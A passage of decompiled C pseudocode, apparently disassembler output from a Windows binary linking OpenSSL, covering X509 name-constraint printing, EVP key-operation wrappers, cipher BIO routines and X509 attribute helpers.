        if ( strncmp(*(const char **)(v6 + 4), "excluded", 8u) || (v9 = *(_DWORD *)(v6 + 4), !*(_BYTE *)(v9 + 8)) )
        {
          sub_408310(34, 147, 143, (int)"crypto\\x509v3\\v3_ncons.c", 86);
          goto LABEL_20;
        }
        ++v4;
        v8 = v9 + 9;
      }
      v14 = v8;
      v15 = *(_DWORD *)(v6 + 8);
      v3 = (_DWORD **)sub_42FB20((int)&unk_50ED78);
      if ( !v3 )
        goto LABEL_16;
      if ( !sub_44E970(*v3, a1, a2, (int)v13, 1) )
        break;
      if ( !*v4 && (v10 = sub_426AF0(), (*v4 = v10) == 0) || !sub_4269B0(*v4, (int)v3) )
      {
LABEL_16:
        v4 = v12;
        goto LABEL_17;
      }
      v3 = 0;
      ++v5;
      v4 = v12;
      if ( v5 >= sub_426A30((int)a3) )
        return v4;
    }
    v4 = v12;
  }
  else
  {
LABEL_17:
    sub_408310(34, 147, 65, (int)"crypto\\x509v3\\v3_ncons.c", 105);
  }
LABEL_20:
  sub_42FEF0((int)v4, (int)&unk_50EDBC);
  sub_42FEF0((int)v3, (int)&unk_50ED78);
  return 0;
}
// 453210: using guessed type char var_C[4];

//----- (004533A0) --------------------------------------------------------
int __usercall sub_4533A0@<eax>(int a1@<ebx>, int *a2)
{
  unsigned __int8 *v2; // esi
  int v3; // edi
  int i; // edi

  v2 = (unsigned __int8 *)a2[2];
  v3 = *a2;
  sub_4051D0(a1, (int)"IP:");
  if ( v3 == 8 )
  {
    sub_419190(a1, "%d.%d.%d.%d/%d.%d.%d.%d", *v2, v2[1], v2[2], v2[3], v2[4], v2[5], v2[6], v2[7]);
    return 1;
  }
  else if ( v3 == 32 )
  {
    for ( i = 0; i < 16; ++i )
    {
      sub_419190(a1, "%X", v2[1] | (*v2 << 8));
      v2 += 2;
      if ( i == 7 )
      {
        sub_4051D0(a1, (int)"/");
      }
      else if ( i != 15 )
      {
        sub_4051D0(a1, (int)word_4F1980);
      }
    }
    return 1;
  }
  else
  {
    sub_419190(a1, "IP Address:<invalid>");
    return 1;
  }
}

//----- (00453470) --------------------------------------------------------
int __fastcall sub_453470(int a1, int a2, int *a3, const char *a4)
{
  int v6; // edi
  int *v7; // esi
  int v9; // [esp+10h] [ebp-4h]

  if ( sub_426A30((int)a3) > 0 )
    sub_419190(a2, "%*s%s:\n", a1, byte_4F1291, a4);
  v6 = 0;
  if ( sub_426A30((int)a3) > 0 )
  {
    v9 = a1 + 2;
    do
    {
      v7 = (int *)sub_426A40(a3, v6);
      sub_419190(a2, "%*s", v9, byte_4F1291);
      if ( *(_DWORD *)*v7 == 7 )
        sub_4533A0(a2, *(int **)(*v7 + 4));
      else
        sub_44E1B0(a2, *v7);
      sub_4051D0(a2, (int)"\n");
      ++v6;
    }
    while ( v6 < sub_426A30((int)a3) );
  }
  return 1;
}

//----- (00453530) --------------------------------------------------------
int __cdecl sub_453530(int a1, int **a2, int a3, int a4)
{
  sub_453470(a4, a3, *a2, "Permitted");
  sub_453470(a4, a3, a2[1], "Excluded");
  return 1;
}

//----- (00453570) --------------------------------------------------------
void __cdecl sub_453570(void **Block)
{
  if ( Block )
  {
    sub_47FA30(*Block);
    sub_426C00(Block[1], (void (__cdecl *)(_DWORD))sub_47FA30);
    sub_413490(Block);
  }
}

//----- (004535B0) --------------------------------------------------------
void __cdecl sub_4535B0(int a1)
{
  sub_42FEF0(a1, (int)&unk_50EEF4);
}

//----- (004535D0) --------------------------------------------------------
BOOL __cdecl sub_4535D0(int a1)
{
  return *(_DWORD *)(a1 + 180) != 0;
}

//----- (004535E0) --------------------------------------------------------
int __cdecl sub_4535E0(int a1, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = *(_DWORD *)(a1 + 180);
  if ( !v2 )
    return 0;
  v3 = *(_DWORD **)(v2 + 8);
  if ( !v3 )
    return 0;
  if ( a2 )
    *a2 = *v3;
  return *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 180) + 8) + 8);
}

//----- (00453620) --------------------------------------------------------
int __cdecl sub_453620(int a1, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = *(_DWORD *)(a1 + 180);
  if ( !v2 )
    return 0;
  v3 = *(_DWORD **)(v2 + 12);
  if ( !v3 )
    return 0;
  if ( a2 )
    *a2 = *v3;
  return *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 180) + 12) + 8);
}

//----- (00453660) --------------------------------------------------------
int __cdecl sub_453660(int a1)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 180);
  if ( v1 )
    return *(_DWORD *)v1;
  else
    return 0;
}

//----- (00453680) --------------------------------------------------------
int __cdecl sub_453680(int a1)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 180);
  if ( v1 )
    return *(_DWORD *)(v1 + 4);
  else
    return 0;
}

//----- (004536A0) --------------------------------------------------------
void *sub_4536A0()
{
  return &unk_50EF20;
}

//----- (004536B0) --------------------------------------------------------
int __cdecl sub_4536B0(int a1)
{
  int result; // eax
  int v2; // edi

  result = (int)sub_42B820();
  v2 = result;
  if ( result )
  {
    sub_405000(a1, 1);
    sub_404FE0(a1, v2);
    return 1;
  }
  return result;
}

//----- (004536E0) --------------------------------------------------------
int __cdecl sub_4536E0(int a1)
{
  _BYTE *v2; // eax

  if ( !a1 )
    return 0;
  v2 = (_BYTE *)sub_404FF0(a1);
  sub_42B840(v2);
  sub_404FE0(a1, 0);
  sub_405000(a1, 0);
  return 1;
}

//----- (00453720) --------------------------------------------------------
int __cdecl sub_453720(_DWORD *a1, int a2, int a3)
{
  int v4; // ebx
  int v5; // eax
  int v6; // edi

  if ( !a2 )
    return 0;
  v4 = sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  if ( !v4 || !v5 )
    return 0;
  v6 = sub_405040(v5, a2, a3);
  if ( sub_407400((int)a1) && v6 > 0 && sub_42BA10(v4) <= 0 )
    return -1;
  sub_405010((int)a1, 15);
  sub_405580(a1);
  return v6;
}

//----- (004537B0) --------------------------------------------------------
int __cdecl sub_4537B0(_DWORD *a1, int a2, int a3)
{
  int v3; // edi
  int v4; // ebx
  int v5; // eax
  int v6; // esi

  v3 = 0;
  if ( !a2 || a3 <= 0 )
    return 0;
  v4 = sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  v6 = v5;
  if ( v4 && v5 )
    v3 = sub_405110(v5, a2, a3);
  if ( !sub_407400((int)a1) || v3 <= 0 || sub_42BA10(v4) )
  {
    if ( v6 )
    {
      sub_405010((int)a1, 15);
      sub_405580(a1);
    }
    return v3;
  }
  else
  {
    sub_405010((int)a1, 15);
    return 0;
  }
}

//----- (00453860) --------------------------------------------------------
int __cdecl sub_453860(_DWORD *a1, int a2, int a3, int *a4)
{
  int **v4; // ebx
  int v5; // eax
  int v6; // ecx
  _DWORD *v7; // ebp
  int v8; // edi
  int result; // eax
  int v10; // edi
  int v11; // eax

  v4 = (int **)sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  v6 = a2;
  v7 = (_DWORD *)v5;
  switch ( a2 )
  {
    case 1:
      if ( !sub_407400((int)a1) )
        goto LABEL_9;
      v8 = sub_42B860((int)v4, *v4, 0);
      if ( v8 <= 0 )
        goto LABEL_6;
      v6 = a2;
      goto LABEL_5;
    case 12:
      v11 = sub_404FF0((int)a4);
      result = sub_42BAA0(v11, (int)v4);
      if ( !result )
        return result;
      goto LABEL_11;
    case 101:
      sub_405010((int)a1, 15);
      v10 = sub_405390(v7, a2, a3, (int)a4);
      sub_405580(a1);
      return v10;
    case 111:
      v8 = sub_42B860((int)v4, a4, 0);
      if ( v8 <= 0 )
        goto LABEL_6;
      sub_405000((int)a1, 1);
      result = v8;
      break;
    case 112:
      if ( !sub_407400((int)a1) )
        goto LABEL_9;
      *a4 = (int)*v4;
      result = 1;
      break;
    case 120:
      *a4 = (int)v4;
LABEL_11:
      sub_405000((int)a1, 1);
      result = 1;
      break;
    case 148:
      if ( sub_407400((int)a1) )
      {
        sub_404FE0((int)a1, (int)a4);
        result = 1;
      }
      else
      {
LABEL_9:
        result = 0;
      }
      break;
    default:
LABEL_5:
      v8 = sub_405390(v7, v6, a3, (int)a4);
LABEL_6:
      result = v8;
      break;
  }
  return result;
}

//----- (00453AC0) --------------------------------------------------------
int __cdecl sub_453AC0(int *a1)
{
  int v1; // eax
  int (__cdecl *v2)(int *); // eax
  int result; // eax

  if ( a1 && (v1 = *a1) != 0 && *(_DWORD *)(v1 + 40) )
  {
    a1[4] = 8;
    v2 = *(int (__cdecl **)(int *))(v1 + 36);
    if ( v2 )
    {
      result = v2(a1);
      if ( result <= 0 )
        a1[4] = 0;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    sub_408310(6, 141, 150, (int)"crypto\\evp\\pmeth_fn.c", 38);
    return -2;
  }
  return result;
}

//----- (00453B20) --------------------------------------------------------
int __cdecl sub_453B20(int *a1, int a2, unsigned int *a3, int a4, int a5)
{
  int v5; // eax
  unsigned int v7; // eax

  if ( a1 && (v5 = *a1) != 0 && *(_DWORD *)(v5 + 40) )
  {
    if ( a1[4] != 8 )
    {
      sub_408310(6, 140, 151, (int)"crypto\\evp\\pmeth_fn.c", 60);
      return -1;
    }
    if ( (*(_BYTE *)(v5 + 4) & 2) == 0 )
      return (*(int (__cdecl **)(int *, int, unsigned int *, int, int))(*a1 + 40))(a1, a2, a3, a4, a5);
    v7 = sub_41CA90(a1[2]);
    if ( !a2 )
    {
      *a3 = v7;
      return 1;
    }
    if ( *a3 < v7 )
    {
      sub_408310(6, 140, 155, (int)"crypto\\evp\\pmeth_fn.c", 63);
      return 0;
    }
    else
    {
      return (*(int (__cdecl **)(int *, int, unsigned int *, int, int))(*a1 + 40))(a1, a2, a3, a4, a5);
    }
  }
  else
  {
    sub_408310(6, 140, 150, (int)"crypto\\evp\\pmeth_fn.c", 56);
    return -2;
  }
}

//----- (00453C00) --------------------------------------------------------
int __cdecl sub_453C00(int *a1)
{
  int v1; // eax
  int (__cdecl *v2)(int *); // eax
  int result; // eax

  if ( a1 && (v1 = *a1) != 0 && *(_DWORD *)(v1 + 48) )
  {
    a1[4] = 16;
    v2 = *(int (__cdecl **)(int *))(v1 + 44);
    if ( v2 )
    {
      result = v2(a1);
      if ( result <= 0 )
        a1[4] = 0;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    sub_408310(6, 143, 150, (int)"crypto\\evp\\pmeth_fn.c", 72);
    return -2;
  }
  return result;
}

//----- (00453C60) --------------------------------------------------------
int __cdecl sub_453C60(_DWORD *a1)
{
  int (*v1)(void); // eax

  if ( a1 && *a1 && (v1 = *(int (**)(void))(*a1 + 48)) != 0 )
  {
    if ( a1[4] == 16 )
    {
      return v1();
    }
    else
    {
      sub_408310(6, 142, 151, (int)"crypto\\evp\\pmeth_fn.c", 94);
      return -1;
    }
  }
  else
  {
    sub_408310(6, 142, 150, (int)"crypto\\evp\\pmeth_fn.c", 90);
    return -2;
  }
}

//----- (00453CD0) --------------------------------------------------------
int __cdecl sub_453CD0(int *a1)
{
  int v1; // eax
  int (__cdecl *v2)(int *); // eax
  int result; // eax

  if ( a1 && (v1 = *a1) != 0 && *(_DWORD *)(v1 + 80) )
  {
    a1[4] = 256;
    v2 = *(int (__cdecl **)(int *))(v1 + 76);
    if ( v2 )
    {
      result = v2(a1);
      if ( result <= 0 )
        a1[4] = 0;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    sub_408310(6, 139, 150, (int)"crypto\\evp\\pmeth_fn.c", 139);
    return -2;
  }
  return result;
}

//----- (00453D40) --------------------------------------------------------
int __cdecl sub_453D40(int *a1, int a2, unsigned int *a3, int a4, int a5)
{
  int v5; // eax
  unsigned int v7; // eax

  if ( a1 && (v5 = *a1) != 0 && *(_DWORD *)(v5 + 80) )
  {
    if ( a1[4] != 256 )
    {
      sub_408310(6, 105, 151, (int)"crypto\\evp\\pmeth_fn.c", 161);
      return -1;
    }
    if ( (*(_BYTE *)(v5 + 4) & 2) == 0 )
      return (*(int (__cdecl **)(int *, int, unsigned int *, int, int))(*a1 + 80))(a1, a2, a3, a4, a5);
    v7 = sub_41CA90(a1[2]);
    if ( !a2 )
    {
      *a3 = v7;
      return 1;
    }
    if ( *a3 < v7 )
    {
      sub_408310(6, 105, 155, (int)"crypto\\evp\\pmeth_fn.c", 164);
      return 0;
    }
    else
    {
      return (*(int (__cdecl **)(int *, int, unsigned int *, int, int))(*a1 + 80))(a1, a2, a3, a4, a5);
    }
  }
  else
  {
    sub_408310(6, 105, 150, (int)"crypto\\evp\\pmeth_fn.c", 157);
    return -2;
  }
}

//----- (00453E20) --------------------------------------------------------
int __cdecl sub_453E20(int a1, _DWORD *a2)
{
  _DWORD *v2; // eax
  int (__cdecl *v3)(int, int, _DWORD, _DWORD *); // eax
  int v4; // ecx
  int result; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  if ( !a1
    || (v2 = *(_DWORD **)a1) == 0
    || !v2[24] && !v2[20] && !v2[22]
    || (v3 = (int (__cdecl *)(int, int, _DWORD, _DWORD *))v2[25]) == 0 )
  {
    sub_408310(6, 155, 150, (int)"crypto\\evp\\pmeth_fn.c", 226);
    return -2;
  }
  v4 = *(_DWORD *)(a1 + 16);
  if ( v4 != 1024 && v4 != 256 && v4 != 512 )
  {
    sub_408310(6, 155, 151, (int)"crypto\\evp\\pmeth_fn.c", 233);
    return -1;
  }
  result = v3(a1, 2, 0, a2);
  if ( result > 0 )
  {
    if ( result != 2 )
    {
      v6 = *(_DWORD **)(a1 + 8);
      if ( !v6 )
      {
        sub_408310(6, 155, 154, (int)"crypto\\evp\\pmeth_fn.c", 246);
        return -1;
      }
      if ( *v6 != *a2 )
      {
        sub_408310(6, 155, 101, (int)"crypto\\evp\\pmeth_fn.c", 251);
        return -1;
      }
      if ( !sub_41CAB0((int)a2) && !sub_41CAD0(*(_DWORD **)(a1 + 8), a2) )
      {
        sub_408310(6, 155, 153, (int)"crypto\\evp\\pmeth_fn.c", 264);
        return -1;
      }
      sub_41CEB0(*(volatile LONG **)(a1 + 12));
      v7 = *(_DWORD **)a1;
      *(_DWORD *)(a1 + 12) = a2;
      result = ((int (__cdecl *)(int, int, int, _DWORD *))v7[25])(a1, 2, 1, a2);
      if ( result <= 0 )
      {
        *(_DWORD *)(a1 + 12) = 0;
        return result;
      }
      sub_41CB90((int)a2);
    }
    return 1;
  }
  return result;
}

//----- (00453F90) --------------------------------------------------------
int __cdecl sub_453F90(int *a1, int a2, unsigned int *a3)
{
  int v3; // eax
  unsigned int v5; // eax

  if ( a1 && (v3 = *a1) != 0 && *(_DWORD *)(v3 + 96) )
  {
    if ( a1[4] != 1024 )
    {
      sub_408310(6, 153, 151, (int)"crypto\\evp\\pmeth_fn.c", 290);
      return -1;
    }
    if ( (*(_BYTE *)(v3 + 4) & 2) == 0 )
      return (*(int (__cdecl **)(int *, int, unsigned int *))(*a1 + 96))(a1, a2, a3);
    v5 = sub_41CA90(a1[2]);
    if ( !a2 )
    {
      *a3 = v5;
      return 1;
    }
    if ( *a3 < v5 )
    {
      sub_408310(6, 153, 155, (int)"crypto\\evp\\pmeth_fn.c", 293);
      return 0;
    }
    else
    {
      return (*(int (__cdecl **)(int *, int, unsigned int *))(*a1 + 96))(a1, a2, a3);
    }
  }
  else
  {
    sub_408310(6, 153, 150, (int)"crypto\\evp\\pmeth_fn.c", 286);
    return -2;
  }
}

//----- (00454070) --------------------------------------------------------
void *sub_454070()
{
  return &unk_50EF60;
}

//----- (00454080) --------------------------------------------------------
int __cdecl sub_454080(_DWORD *a1)
{
  a1[3] = 1;
  a1[7] = 0;
  a1[8] = 0;
  return 1;
}

//----- (004540A0) --------------------------------------------------------
BOOL __cdecl sub_4540A0(int a1)
{
  return a1 != 0;
}

//----- (004540B0) --------------------------------------------------------
int __cdecl sub_4540B0(int a1, int a2, int a3)
{
  return a3;
}

//----- (004540C0) --------------------------------------------------------
int __cdecl sub_4540C0(int a1, int a2)
{
  int result; // eax

  switch ( a2 )
  {
    case 1:
    case 2:
    case 4:
    case 9:
    case 11:
    case 12:
      result = 1;
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (00454100) --------------------------------------------------------
unsigned int __cdecl sub_454100(int a1, const char *a2)
{
  unsigned int result; // eax

  result = (unsigned int)a2;
  if ( a2 )
    return strlen(a2);
  return result;
}

//----- (00454120) --------------------------------------------------------
void *sub_454120()
{
  return &unk_50EF90;
}

//----- (00454130) --------------------------------------------------------
int __cdecl sub_454130(int a1)
{
  _DWORD *v1; // esi
  void *v2; // eax

  v1 = sub_413430(0x1140u);
  if ( !v1 )
    return 0;
  v2 = sub_405990();
  v1[5] = v2;
  if ( !v2 )
  {
    sub_413490(v1);
    return 0;
  }
  v1[2] = 1;
  v1[4] = 1;
  v1[6] = v1 + 80;
  v1[7] = v1 + 80;
  sub_404FE0(a1, (int)v1);
  sub_405000(a1, 1);
  return 1;
}

//----- (004541B0) --------------------------------------------------------
int __cdecl sub_4541B0(int a1)
{
  int result; // eax
  _BYTE *v2; // esi

  if ( !a1 )
    return 0;
  result = sub_404FF0(a1);
  v2 = (_BYTE *)result;
  if ( result )
  {
    sub_4059B0(*(void **)(result + 20));
    sub_4134B0(v2, 4416);
    sub_404FE0(a1, 0);
    sub_405000(a1, 0);
    return 1;
  }
  return result;
}

//----- (00454210) --------------------------------------------------------
int __cdecl sub_454210(_DWORD *a1, char *a2, int a3)
{
  int result; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ebp
  signed int v7; // edi
  int v8; // eax
  int v9; // edi
  int v10; // eax
  int v11; // edi
  const void *v12; // ebx
  int v13; // ebx
  int v14; // eax
  bool v15; // zf
  signed int v16; // edi
  _DWORD *v17; // [esp-18h] [ebp-2Ch]
  int v18; // [esp+4h] [ebp-10h]
  int v19; // [esp+8h] [ebp-Ch]
  int v20; // [esp+Ch] [ebp-8h]
  int v21; // [esp+10h] [ebp-4h] BYREF

  v18 = 0;
  if ( !a2 )
    return 0;
  v4 = sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  v19 = v5;
  if ( !v4 || !v5 )
    return 0;
  v6 = a3;
  if ( *(int *)v4 > 0 )
  {
    v7 = *(_DWORD *)v4 - *(_DWORD *)(v4 + 4);
    if ( v7 > a3 )
      v7 = a3;
    memcpy(a2, (const void *)(*(_DWORD *)(v4 + 4) + v4 + 32), v7);
    *(_DWORD *)(v4 + 4) += v7;
    v6 = a3 - v7;
    v18 = v7;
    a2 += v7;
    if ( *(_DWORD *)v4 == *(_DWORD *)(v4 + 4) )
    {
      *(_DWORD *)v4 = 0;
      *(_DWORD *)(v4 + 4) = 0;
    }
  }
  v20 = sub_4073D0(*(_DWORD *)(v4 + 20));
  if ( v20 == 1 )
    v20 = 0;
  if ( v6 > 0 )
  {
    while ( 1 )
    {
      if ( *(int *)(v4 + 8) <= 0 )
        goto LABEL_37;
      v8 = *(_DWORD *)(v4 + 24);
      v9 = *(_DWORD *)(v4 + 28);
      if ( v8 == v9 )
      {
        *(_DWORD *)(v4 + 24) = v4 + 320;
        *(_DWORD *)(v4 + 28) = v4 + 320;
        v10 = sub_405040(v19, v4 + 320, 4096);
        v11 = v10;
        if ( v10 <= 0 )
          break;
        *(_DWORD *)(v4 + 28) += v10;
      }
      else
      {
        v11 = v9 - v8;
      }
      if ( v11 <= 0 )
        break;
      if ( v6 > 256 )
      {
        v13 = v6 - v20;
        v14 = v6 - v20;
        if ( v11 <= v6 - v20 )
          v14 = v11;
        if ( !sub_406560(*(_DWORD **)(v4 + 20), a2, &v21, *(char **)(v4 + 24), v14) )
        {
          sub_405010((int)a1, 15);
          return 0;
        }
        v18 += v21;
        a2 += v21;
        v11 -= v13;
        v6 -= v21;
        if ( v11 <= 0 )
        {
          *(_DWORD *)(v4 + 24) = *(_DWORD *)(v4 + 28);
          goto LABEL_36;
        }
        *(_DWORD *)(v4 + 24) += v13;
      }
      if ( v11 > 256 )
        v11 = 256;
      v12 = (const void *)(v4 + 32);
      if ( !sub_406560(*(_DWORD **)(v4 + 20), (char *)(v4 + 32), (int *)v4, *(char **)(v4 + 24), v11) )
      {
        sub_405010((int)a1, 15);
        *(_DWORD *)(v4 + 16) = 0;
        return 0;
      }
      *(_DWORD *)(v4 + 24) += v11;
      v15 = *(_DWORD *)v4 == 0;
      *(_DWORD *)(v4 + 8) = 1;
      if ( !v15 )
        goto LABEL_32;
LABEL_36:
      if ( v6 <= 0 )
        goto LABEL_37;
    }
    if ( sub_405020(v19, 8) )
    {
      if ( !v18 )
        v18 = v11;
      goto LABEL_37;
    }
    v12 = (const void *)(v4 + 32);
    v17 = *(_DWORD **)(v4 + 20);
    *(_DWORD *)(v4 + 8) = v11;
    *(_DWORD *)(v4 + 16) = sub_406580(v17, v4 + 32, (int *)v4);
    *(_DWORD *)(v4 + 4) = 0;
LABEL_32:
    v16 = *(_DWORD *)v4;
    if ( *(_DWORD *)v4 > v6 )
      v16 = v6;
    if ( v16 <= 0 )
      goto LABEL_37;
    memcpy(a2, v12, v16);
    v18 += v16;
    v6 -= v16;
    *(_DWORD *)(v4 + 4) = v16;
    a2 += v16;
    goto LABEL_36;
  }
LABEL_37:
  sub_405010((int)a1, 15);
  sub_405580(a1);
  result = v18;
  if ( !v18 )
    return *(_DWORD *)(v4 + 8);
  return result;
}

//----- (00454490) --------------------------------------------------------
int __cdecl sub_454490(_DWORD *a1, char *a2, int a3)
{
  int v3; // esi
  int v4; // eax
  int v5; // ebp
  int v6; // edi
  int v7; // eax
  int v8; // ebx
  int v9; // edi
  int v10; // edi
  bool v11; // cc
  int v12; // eax
  int v14; // [esp+Ch] [ebp-8h]

  v3 = sub_404FF0((int)a1);
  v4 = sub_405540((int)a1);
  v14 = v4;
  if ( !v3 || !v4 )
    return 0;
  v5 = a3;
  sub_405010((int)a1, 15);
  v6 = *(_DWORD *)v3 - *(_DWORD *)(v3 + 4);
  if ( v6 > 0 )
  {
    while ( 1 )
    {
      v7 = sub_405110(v14, *(_DWORD *)(v3 + 4) + v3 + 32, v6);
      v8 = v7;
      if ( v7 <= 0 )
        break;
      *(_DWORD *)(v3 + 4) += v7;
      v6 -= v7;
      if ( v6 <= 0 )
        goto LABEL_6;
    }
    sub_405580(a1);
    return v8;
  }
LABEL_6:
  if ( !a2 || a3 <= 0 )
    return 0;
  *(_DWORD *)(v3 + 4) = 0;
  while ( 1 )
  {
    v9 = 4096;
    if ( v5 <= 4096 )
      v9 = v5;
    if ( !sub_406560(*(_DWORD **)(v3 + 20), (char *)(v3 + 32), (int *)v3, a2, v9) )
    {
      sub_405010((int)a1, 15);
      *(_DWORD *)(v3 + 16) = 0;
      return 0;
    }
    a2 += v9;
    v5 -= v9;
    v10 = *(_DWORD *)v3;
    v11 = *(_DWORD *)v3 <= 0;
    *(_DWORD *)(v3 + 4) = 0;
    if ( !v11 )
      break;
LABEL_15:
    *(_DWORD *)v3 = 0;
    *(_DWORD *)(v3 + 4) = 0;
    if ( v5 <= 0 )
    {
      sub_405580(a1);
      return a3;
    }
  }
  while ( 1 )
  {
    v12 = sub_405110(v14, *(_DWORD *)(v3 + 4) + v3 + 32, v10);
    v8 = v12;
    if ( v12 <= 0 )
      break;
    *(_DWORD *)(v3 + 4) += v12;
    v10 -= v12;
    if ( v10 <= 0 )
      goto LABEL_15;
  }
  sub_405580(a1);
  if ( a3 == v5 )
    return v8;
  return a3 - v5;
}

//----- (00454620) --------------------------------------------------------
int __cdecl sub_454620(_DWORD *a1, int a2, int a3, _DWORD *a4)
{
  int v4; // edi
  int v5; // esi
  _DWORD *v6; // ebp
  int result; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edi
  int v11; // edi
  void *v12; // eax
  _DWORD *v13; // [esp-Ch] [ebp-1Ch]
  int v14; // [esp-4h] [ebp-14h]

  v4 = 1;
  v5 = sub_404FF0((int)a1);
  v6 = (_DWORD *)sub_405540((int)a1);
  if ( !v5 )
    return 0;
  v8 = a2;
  switch ( a2 )
  {
    case 1:
      v14 = *(_DWORD *)(v5 + 20);
      *(_DWORD *)(v5 + 16) = 1;
      *(_DWORD *)(v5 + 12) = 0;
      v9 = sub_432B60(v14);
      if ( !sub_406270(*(int ***)(v5 + 20), 0, 0, 0, 0, v9) )
        return 0;
      return sub_405390(v6, a2, a3, (int)a4);
    case 2:
      if ( *(int *)(v5 + 8) > 0 )
        return sub_405390(v6, a2, a3, (int)a4);
      return v4;
    case 10:
    case 13:
      v4 = *(_DWORD *)v5 - *(_DWORD *)(v5 + 4);
      if ( v4 > 0 )
        return v4;
      return sub_405390(v6, a2, a3, (int)a4);
    case 11:
      break;
    case 12:
      v11 = sub_404FF0((int)a4);
      v12 = sub_405990();
      *(_DWORD *)(v11 + 20) = v12;
      if ( !v12 )
        return 0;
      v4 = sub_406160(v12, *(_DWORD *)(v5 + 20));
      if ( !v4 )
        return v4;
      sub_405000((int)a4, 1);
      return v4;
    case 101:
      sub_405010((int)a1, 15);
      v10 = sub_405390(v6, a2, a3, (int)a4);
      sub_405580(a1);
      return v10;
    case 113:
      return *(_DWORD *)(v5 + 16);
    case 129:
      *a4 = *(_DWORD *)(v5 + 20);
      sub_405000((int)a1, 1);
      return 1;
    default:
      return sub_405390(v6, v8, a3, (int)a4);
  }
  while ( *(_DWORD *)v5 == *(_DWORD *)(v5 + 4) )
  {
LABEL_14:
    if ( *(_DWORD *)(v5 + 12) )
      return sub_405390(v6, v8, a3, (int)a4);
    v13 = *(_DWORD **)(v5 + 20);
    *(_DWORD *)(v5 + 12) = 1;
    *(_DWORD *)(v5 + 4) = 0;
    v4 = sub_406580(v13, v5 + 32, (int *)v5);
    *(_DWORD *)(v5 + 16) = v4;
    if ( v4 <= 0 )
      return v4;
    v8 = a2;
  }
  while ( 1 )
  {
    result = sub_454490(a1, 0, 0);
    if ( result < 0 )
      return result;
    if ( *(_DWORD *)v5 == *(_DWORD *)(v5 + 4) )
    {
      v8 = a2;
      goto LABEL_14;
    }
  }
}

//----- (004548D0) --------------------------------------------------------
int __cdecl sub_4548D0(int a1, int a2, int a3)
{
  int v3; // esi
  int (__cdecl *v4)(int, int, int *, int, _DWORD, int); // edi
  int result; // eax

  result = sub_405540(a1);
  if ( result )
  {
    v3 = result;
    if ( *(_DWORD *)result && *(_DWORD *)(*(_DWORD *)result + 36) )
    {
      v4 = *(int (__cdecl **)(int, int, int *, int, _DWORD, int))(result + 4);
      if ( !v4 || (result = v4(result, 6, &a3, a2, 0, 1), result > 0) )
      {
        result = (*(int (__cdecl **)(int, int, int))(*(_DWORD *)v3 + 36))(v3, a2, a3);
        if ( v4 )
          return v4(v3, 134, &a3, a2, 0, result);
      }
    }
    else
    {
      sub_408310(32, 131, 121, (int)"crypto\\bio\\bio_lib.c", 364);
      return -2;
    }
  }
  return result;
}
// 405427: conditional instruction was optimized away because %arg_0.4!=0

//----- (00454900) --------------------------------------------------------
int __cdecl sub_454900(int *a1, int a2, int a3)
{
  int v4; // esi
  int v5; // edi
  int *v6; // eax

  if ( !a1 )
    return -1;
  v4 = a3 + 1;
  if ( a3 + 1 < 0 )
    v4 = 0;
  v5 = sub_426A30((int)a1);
  if ( v4 >= v5 )
    return -1;
  while ( 1 )
  {
    v6 = (int *)sub_426A40(a1, v4);
    if ( !sub_439FC0(*v6, a2) )
      break;
    if ( ++v4 >= v5 )
      return -1;
  }
  return v4;
}

//----- (00454960) --------------------------------------------------------
void **__cdecl sub_454960(void ***a1, void *a2)
{
  int v2; // edi
  void **v3; // esi
  void *v4; // eax

  v2 = 0;
  v3 = 0;
  if ( !a1 )
  {
    sub_408310(11, 135, 67, (int)"crypto\\x509\\x509_att.c", 80);
LABEL_8:
    sub_42C870(v2);
    sub_4269F0(v3);
    return 0;
  }
  v3 = *a1;
  if ( !*a1 )
  {
    v3 = (void **)sub_426AF0();
    if ( !v3 )
      goto LABEL_7;
  }
  v4 = sub_42C890(a2);
  v2 = (int)v4;
  if ( !v4 )
    goto LABEL_8;
  if ( !sub_4269B0((int *)v3, (int)v4) )
  {
LABEL_7:
    sub_408310(11, 135, 65, (int)"crypto\\x509\\x509_att.c", 98);
    goto LABEL_8;
  }
  if ( !*a1 )
    *a1 = v3;
  return v3;
}

//----- (004549F0) --------------------------------------------------------
int __cdecl sub_4549F0(int a1, int a2, char *Src, signed int Size)
{
  void **v4; // esi
  int v5; // ebx
  int v7; // eax
  signed int v8; // ebp
  int v9; // eax
  int *v10; // eax
  int v11; // [esp+8h] [ebp-8h]

  v4 = 0;
  v5 = 0;
  v11 = 0;
  if ( !a1 )
    return 0;
  if ( (a2 & 0x1000) != 0 )
  {
    v7 = sub_423680(*(_DWORD *)a1);
    v8 = Size;
    v9 = sub_47F850(0, Src, Size, a2, v7);
    v4 = (void **)v9;
    if ( !v9 )
    {
      sub_408310(11, 138, 13, (int)"crypto\\x509\\x509_att.c", 257);
      return 0;
    }
    v11 = *(_DWORD *)(v9 + 4);
  }
  else
  {
    v8 = Size;
    if ( Size != -1 )
    {
      v4 = (void **)sub_4329F0(a2);
      if ( !v4 || !sub_432910((int)v4, Src, Size) )
        goto LABEL_21;
      v11 = a2;
    }
  }
  if ( !a2 )
  {
    sub_432A30(v4);
    return 1;
  }
  v10 = (int *)sub_42C600();
  v5 = (int)v10;
  if ( v10 )
  {
    if ( v8 != -1 || (a2 & 0x1000) != 0 )
    {
      sub_423E40(v10, v11, (int)v4);
      v4 = 0;
    }
    else if ( !sub_423E90(v10, a2, (int *)Src) )
    {
      goto LABEL_21;
    }
    if ( sub_4269B0(*(int **)(a1 + 4), v5) )
      return 1;
  }
LABEL_21:
  sub_408310(11, 138, 65, (int)"crypto\\x509\\x509_att.c", 290);
